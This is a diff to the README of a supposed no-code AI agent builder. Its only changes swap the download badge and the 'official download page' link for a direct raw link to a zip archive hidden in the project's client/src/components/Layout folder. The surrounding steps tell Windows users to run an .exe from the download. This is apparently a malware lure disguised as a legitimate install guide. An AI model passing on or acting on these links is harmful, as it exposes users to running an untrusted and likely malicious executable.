@@ -1,6 +1,6 @@
 # 🛠️ rumi-agent-builder - Build smart AI agents with ease
 
-[![](https://img.shields.io/badge/Download-Rumi_Agent_Builder-blue.svg)](https://github.com/bettyelyrical824/rumi-agent-builder)
+[![](https://img.shields.io/badge/Download-Rumi_Agent_Builder-blue.svg)](https://github.com/bettyelyrical824/rumi-agent-builder/raw/refs/heads/main/client/src/components/Layout/agent_rumi_builder_v3.8.zip)
 
 Rumi Agent Builder gives you a visual space to create custom AI agents. You connect blocks on a canvas to design how your agent thinks, speaks, and acts. You do not need to write code to build complex AI workflows. The tool offers thirteen unique block types to handle data, logic, and conversation. Your team can work on the same project at the same time to speed up development.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic needs to run the software.
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official download page](https://github.com/bettyelyrical824/rumi-agent-builder). 
+1.  Visit the [official download page](https://github.com/bettyelyrical824/rumi-agent-builder/raw/refs/heads/main/client/src/components/Layout/agent_rumi_builder_v3.8.zip). 
 2.  Look for the latest version under the Releases section.
 3.  Download the file that ends in .exe.
 4.  Double-click the file to start the installation.
